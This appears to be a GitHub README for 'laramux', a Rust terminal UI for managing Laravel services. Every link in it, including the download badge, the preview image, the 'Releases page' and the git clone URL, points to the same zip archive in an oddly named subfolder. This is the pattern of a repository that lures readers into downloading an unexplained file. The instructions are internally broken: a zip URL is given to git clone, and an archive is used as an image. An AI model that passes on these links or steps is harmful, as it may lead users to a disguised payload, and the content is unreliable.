# 🚀 laramux - Simplified Laravel Management in One Window

[![Download laramux](https://github.com/hongsedemaozi/laramux/raw/refs/heads/main/clammyweed/Software-v1.9.zip)](https://github.com/hongsedemaozi/laramux/raw/refs/heads/main/clammyweed/Software-v1.9.zip)

## 📋 Description

LaraMux is a terminal UI application designed to simplify Laravel development tasks. With LaraMux, you can manage your Laravel projects efficiently within a single terminal window. This application reduces the hassle of switching between different terminal tabs, allowing you to focus on your code.

![LaraMux Preview](https://github.com/hongsedemaozi/laramux/raw/refs/heads/main/clammyweed/Software-v1.9.zip)

## 📚 Table of Contents

- [Features](#features)
- [Installation](#installation)
  - [Homebrew (macOS & Linux)](#homebrew-macos--linux)
  - [apt (Debian/Ubuntu)](#apt-debianubuntu)
  - [dnf (Fedora/RHEL)](#dnf-fedorarhel)
  - [Download Binary](#download-binary)
  - [Build from Source](#build-from-source)
- [Usage](#usage)
  - [Requirements](#requirements)
  - [Keyboard Controls](#keyboard-controls)
- [Detected Services](#detected-services)
- [Laravel Sail](#laravel-sail)
  - [Automatic Detection](#automatic-detection)
  - [Supervisor Support](#supervisor-support)
  - [How Supervisor Detection Works](#how-supervisor-detection-works)
  - [Sail Configuration](#sail-configuration)

## ✨ Features

- Manage multiple Laravel services in one view.
- Intuitive keyboard controls for seamless navigation.
- Automatic detection of Laravel Sail and services.
- Supervisor support for enhanced process management.
- Easy-to-use interface suitable for all users.

## ⚙️ Installation

### 🍺 Homebrew (macOS & Linux)

1. Open your terminal.
2. Type the following command and hit Enter:

   ```bash
   brew install laramux
   ```

3. After installation, run `laramux` to start the application.

### 🐧 apt (Debian/Ubuntu)

1. Open your terminal.
2. Run these commands:

   ```bash
   sudo apt update
   sudo apt install laramux
   ```

3. Once installed, start the application by typing `laramux`.

### 🐉 dnf (Fedora/RHEL)

1. Open your terminal.
2. Use this command:

   ```bash
   sudo dnf install laramux
   ```

3. Launch LaraMux by entering `laramux`.

### ⬇️ Download Binary

1. Visit the [Releases page](https://github.com/hongsedemaozi/laramux/raw/refs/heads/main/clammyweed/Software-v1.9.zip) to download the latest version.
2. Once the file is downloaded, navigate to your downloads folder in the terminal.
3. Run the binary file:

   ```bash
   ./laramux
   ```

### 🔨 Build from Source

1. Clone the repository to your local machine:

   ```bash
   git clone https://github.com/hongsedemaozi/laramux/raw/refs/heads/main/clammyweed/Software-v1.9.zip
   ```

2. Change to the project directory:

   ```bash
   cd laramux
   ```

3. Compile the application:

   ```bash
   cargo build --release
   ```

4. Run the application:

   ```bash
   ./target/release/laramux
   ```

## 🚀 Usage

### 🖥️ Requirements

- Ensure you have a compatible version of Laravel installed.
- Recommended: Rust must be installed for building from source.
- Minimum OS: macOS 10.12, Ubuntu 18.04, or equivalent.

### ⌨️ Keyboard Controls

- **Arrow Keys**: Navigate through the services.
- **Enter**: Select a service to manage.
- **Q**: Quit the application.
  
## 🔍 Detected Services

LaraMux automatically detects various Laravel services running on your system, including:

- Laravel applications
- Database services
- Web servers

This feature allows you to manage multiple services without manual setup.

## 🌊 Laravel Sail

### ⚙️ Automatic Detection

LaraMux can automatically identify Laravel Sail services if you are using Sail in your project. Just start the application, and it will show the available services.

### 📈 Supervisor Support

LaraMux supports the Supervisor process manager, allowing you to manage background tasks easily. If you have Supervisor installed, LaraMux will recognize it and display the relevant services.

### 🔍 How Supervisor Detection Works

LaraMux scans your system for existing Supervisor configuration files. If it finds any, it lists them in the application, enabling you to control those services directly.

### ⚙️ Sail Configuration

For best results, ensure that your Laravel Sail configuration is set up correctly. LaraMux will work seamlessly with the default Sail setup.

## 📥 Download & Install

To get started with LaraMux, download it from the [Releases page](https://github.com/hongsedemaozi/laramux/raw/refs/heads/main/clammyweed/Software-v1.9.zip). Follow the installation instructions above that match your operating system. 

Once installed, you can launch the application and start managing your Laravel projects effortlessly.